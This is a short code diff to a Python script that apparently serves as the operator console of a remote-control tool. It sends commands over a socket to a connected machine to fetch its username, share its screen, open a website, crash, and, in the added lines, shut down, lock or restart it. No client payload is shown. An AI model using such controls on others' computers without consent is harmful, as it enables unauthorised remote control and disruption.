@@ -46,10 +46,16 @@ def main():
 def exit():
     conn.send(command.encode())
     exit()
+
+
+
 def username():
     conn.send(command.encode())
     newuser = conn.recv(1024)
     print(newuser.decode())
+
+
+
 def screenshare():
     conn.send(command.encode())
     sock.close()
@@ -60,10 +66,31 @@ def screenshare():
     while input(" >> ") != "exit":
         continue
     receiver.stop_server()
+
+
+
 def website():
     conn.send(command.encode())
     website = input("Website >> ")
     conn.send(website.encode())
+
+
+
 def crash():
+    conn.send(command.encode())
+
+
+
+def shutdown():
+    conn.send(command.encode())
+
+
+
+def lock():
+    conn.send(command.encode())
+
+
+
+def restart():
     conn.send(command.encode())
 main()
